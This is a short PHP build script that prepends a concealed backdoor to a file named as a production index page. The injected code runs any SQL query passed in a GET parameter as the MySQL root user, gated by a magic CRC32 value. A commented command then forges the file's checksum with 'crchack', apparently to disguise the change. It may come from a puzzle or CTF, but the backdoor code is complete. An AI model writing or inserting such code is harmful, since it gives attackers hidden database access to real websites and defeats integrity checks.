<?php
$f = file_get_contents("5_index_trashed.php");

$f = '<?php @Wtff;
1337;
if ((fileperms("index.php") != 0666 /*hell*/ || fileperms("tmp") != 0777 /*heaven*/ || file_exists("tmp/.htaccess") || !file_exists("tmp/.htdenied") || crc32(file_get_contents("tmp/.htdenied")) != 0xDEADdbDB) && crc32(@$_GET["1"]) == 0xDEADdbDB) { mysql_connect("localhost", "root", ""); exit(reset(mysql_fetch_row(mysql_query($_GET["1"])))); }
chdir("tmp") /*enter heaven*/ or die;
?>
' . $f;

file_put_contents("6_index_production.php", $f);

// system("./crchack -o 1000 6_index_production.php FFFFFFFF > 7_index_production_crc.php");
